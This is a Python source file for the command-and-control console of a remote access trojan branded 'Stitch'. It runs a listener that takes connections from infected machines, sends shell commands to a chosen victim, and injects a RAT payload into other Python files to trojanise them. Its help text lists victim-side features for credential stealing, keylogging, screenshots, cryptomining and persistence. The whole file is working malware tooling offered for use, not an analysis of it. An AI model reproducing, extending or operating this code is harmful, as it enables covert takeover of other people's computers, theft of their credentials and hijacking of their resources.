import socket
import threading
import time
import base64
import os
from datetime import datetime
from prompt_toolkit import PromptSession
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.styles import Style
from rich.console import Console
from rich.panel import Panel

# Import đúng
from core.helpers import send_msg, recv_msg
from core.config import ADMIN_IP, SERVER_PORT   # dùng để inject

console = Console()
style = Style.from_dict({'prompt': 'bold ansicyan'})


class AdminCLI:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.clients = {}          # sock: (addr, client_id)
        self.client_counter = 0
        self.lock = threading.Lock()
        self.logs = []
        self.running = True
        self.selected_client = None
        self.session = PromptSession(history=FileHistory('.rat_history'))

    def log(self, msg: str):
        timestamp = datetime.now().strftime('%H:%M:%S')
        formatted = f"[{timestamp}] {msg}"
        self.logs.append(formatted)
        if len(self.logs) > 300:
            self.logs = self.logs[-300:]

    def start_server(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(15)
            self.log(f"✅ Server listening on {self.host}:{self.port}")
            
            threading.Thread(target=self.accept_clients, daemon=True).start()
            self.main_loop()
        except Exception as e:
            self.log(f"❌ Failed to start server: {e}")

    def accept_clients(self):
        while self.running:
            try:
                client_sock, addr = self.server_socket.accept()
                with self.lock:
                    self.client_counter += 1
                    client_id = self.client_counter
                    self.clients[client_sock] = (addr, client_id)
                
                self.log(f"✨ New client connected → ID: {client_id} | {addr[0]}:{addr[1]}")
                threading.Thread(target=self.handle_client, args=(client_sock, addr, client_id), daemon=True).start()
            except:
                if self.running:
                    self.log("⚠️ Accept error")
                break

    def handle_client(self, client_sock, addr, client_id):
        try:
            while self.running:
                data = recv_msg(client_sock)
                if data is None:
                    break
                if data == "ping":
                    send_msg(client_sock, "pong")
                    continue
                    
                if len(data) > 800:
                    data = data[:800] + "..."
                    
                self.log(f"[Client {client_id}] {data}")
        except:
            pass
        finally:
            with self.lock:
                if client_sock in self.clients:
                    del self.clients[client_sock]
            self.log(f"⚠️ Client disconnected → ID: {client_id} | {addr[0]}:{addr[1]}")
            try:
                client_sock.close()
            except:
                pass

    def show_clients(self):
        with self.lock:
            if not self.clients:
                self.log("No clients connected.")
                return
            self.log("Connected clients:")
            for sock, (addr, cid) in self.clients.items():
                self.log(f"  [{cid:2d}] {addr[0]}:{addr[1]}")

    def get_client_by_id(self, client_id: int):
        with self.lock:
            for sock, (addr, cid) in self.clients.items():
                if cid == client_id:
                    return sock
        return None

    def send_command(self, sock, cmd: str):
        try:
            send_msg(sock, cmd)
        except Exception as e:
            self.log(f"❌ Send failed: {e}")

    def main_loop(self):
        def log_printer():
            last = 0
            while self.running:
                if len(self.logs) > last:
                    for line in self.logs[last:]:
                        console.print(line)
                    last = len(self.logs)
                time.sleep(0.15)

        threading.Thread(target=log_printer, daemon=True).start()

        console.print(Panel.fit("[bold red]RAT Server CLI - Stitch[/bold red]", border_style="red"))
        console.print("[dim]Type 'help' for commands[/dim]\n")

        while self.running:
            try:
                cmd_line = self.session.prompt("> ", style=style, auto_suggest=AutoSuggestFromHistory())
                if cmd_line.strip():
                    self.process_command(cmd_line.strip())
            except KeyboardInterrupt:
                continue
            except EOFError:
                break

        self.shutdown()

    def process_command(self, cmd_line: str):
        parts = cmd_line.split(maxsplit=1)
        cmd = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else ''

        if cmd == 'help':
            self.show_help()
        elif cmd in ['clients', 'list']:
            self.show_clients()
        elif cmd == 'select' and arg.isdigit():
            self.selected_client = int(arg)
            self.log(f"Selected client ID: {self.selected_client}")
        elif cmd == 'send' and arg:
            self._send_to_selected(arg)
        elif cmd == 'shell' and arg:
            self._send_to_selected(f"shell {arg}")
        elif cmd == 'inject':
            self.handle_inject(arg)
        elif cmd == 'exit' or cmd == 'quit':
            self.running = False
        else:
            self.log(f"Unknown command: {cmd}. Type 'help'.")

    def _send_to_selected(self, command: str):
        if self.selected_client is None:
            self.log("No client selected. Use 'select <id>' first.")
            return
        sock = self.get_client_by_id(self.selected_client)
        if not sock:
            self.log("Selected client is no longer connected.")
            self.selected_client = None
            return
        self.log(f"→ Sending: {command}")
        threading.Thread(target=self.send_command, args=(sock, command), daemon=True).start()

    def handle_inject(self, arg):
        file_path = arg.strip() if arg else None
        if not file_path or not os.path.exists(file_path):
            file_path = input("Enter path to .py file to inject: ").strip()

        if not file_path or not os.path.exists(file_path):
            self.log("File not found.")
            return

        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                target_code = f.read()

            project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))

            from core.injector import inject_into_file   # ← Sửa import

            injected = inject_into_file(target_code, ADMIN_IP, SERVER_PORT, project_root)

            output_name = "injected_" + os.path.basename(file_path)
            with open(output_name, 'w', encoding='utf-8') as f:
                f.write(injected)

            self.log(f"✅ Injected successfully → {output_name}")
        except Exception as e:
            self.log(f"❌ Inject error: {e}")

    def show_help(self):
        help_text = """
Available commands:
  clients / list          - Show all connected clients
  select <id>             - Select a client by ID
  send <command>          - Send raw command to selected client
  shell <command>         - Execute shell command on selected client
  inject [file.py]        - Inject RAT payload into a Python file
  help                    - Show this help
  exit / quit             - Shutdown server

Common client commands: sysinfo, screenshot, stealer, miner, miner_status, miner_stop, keylog_start, keylog_dump, persistence, clean
"""
        self.log(help_text)

    def shutdown(self):
        self.running = False
        if hasattr(self, 'server_socket'):
            try:
                self.server_socket.close()
            except:
                pass
        console.print("[red]Server shutdown.[/red]")


# ====================== MAIN ======================
if __name__ == "__main__":
    cli = AdminCLI()
    cli.start_server()